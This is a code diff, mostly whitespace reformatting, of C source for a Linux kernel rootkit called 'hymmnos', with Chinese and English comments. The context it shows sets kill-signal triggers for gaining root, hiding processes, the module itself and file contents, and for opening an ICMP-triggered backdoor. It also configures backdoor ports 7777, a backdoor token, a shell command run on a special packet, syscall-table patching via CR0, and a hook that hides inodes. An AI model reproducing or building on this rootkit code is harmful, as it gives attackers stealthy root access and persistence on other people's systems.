@@ -43,12 +43,12 @@
 
 #define bzero(b, len) (memset((b), '\0', (len)), (void)0)
 // hook kill 函数，kill函数本身是给程序发信号
-#define SIGROOT 48 //kill -48 
-#define SIGHIDEPROC 49 // kill -信号49 隐藏进程
+#define SIGROOT 48        //kill -48
+#define SIGHIDEPROC 49    // kill -信号49 隐藏进程
 #define SIGHIDEHYMMNOS 50 // 隐藏自身
 #define SIGHIDECONTENT 51 // 隐藏文件内容 kill -51
-#define SIGBACKDOOR 52 // 打开后门，监视网络包 icmp
-#define SIGKOMON 53 // 阻止新的内核模块加载，*！*待改进*！*
+#define SIGBACKDOOR 52    // 打开后门，监视网络包 icmp
+#define SIGKOMON 53       // 阻止新的内核模块加载，*！*待改进*！*
 #define SSIZE_MAX 32767
 
 //beginning of the rootkit's configuration
@@ -57,13 +57,13 @@
 #define ROOTKIT_NAME "hymmnos"    //you need to type here name of this module to make this module hidden
 #define SYSCALL_MODIFY_METHOD CR0 //method of making syscall table writeable, CR0 or PAGE_RW
 #define DEBUG 0
-#define HIDETAGIN "<touwaka>" //hiding the file content start
-#define HIDETAGOUT "</touwaka>" //hiding the file content end, the content between start and end will be hidden
+#define HIDETAGIN "<touwaka>"      //hiding the file content start
+#define HIDETAGOUT "</touwaka>"    //hiding the file content end, the content between start and end will be hidden
 #define SHELL "/home/flysoar/test" //when receive the special packet, will execute this cmd
-#define TCPPORT 7777 //backdoor tcp port
-#define UDPPORT 7777 //bcakdoor udp port
-#define TOKEN "tonelico" //backdoor token
-#define WORKNAME "ceil" //workqueen name, should be hidden
+#define TCPPORT 7777               //backdoor tcp port
+#define UDPPORT 7777               //bcakdoor udp port
+#define TOKEN "tonelico"           //backdoor token
+#define WORKNAME "ceil"            //workqueen name, should be hidden
 //end of configuration
 
 #define BEGIN_BUF_SIZE 10000
@@ -384,7 +384,6 @@ int check_process_name(const char *name)
     err = kstrtol(name, 10, &pid);
     if (err != 0)
         goto end;
-
 
     path = kzalloc(strlen("/proc/") + strlen(name) + strlen("/comm") + 1, GFP_KERNEL);
 
@@ -948,10 +947,9 @@ int new_seq_show(struct seq_file *seq, void *v)
     long inode;
     int err;
 
-
     load_inodes_to_hide();
     ret = ref_seq_show(seq, v);
-    
+
     oldfs = get_fs();
     set_fs(get_ds());
 
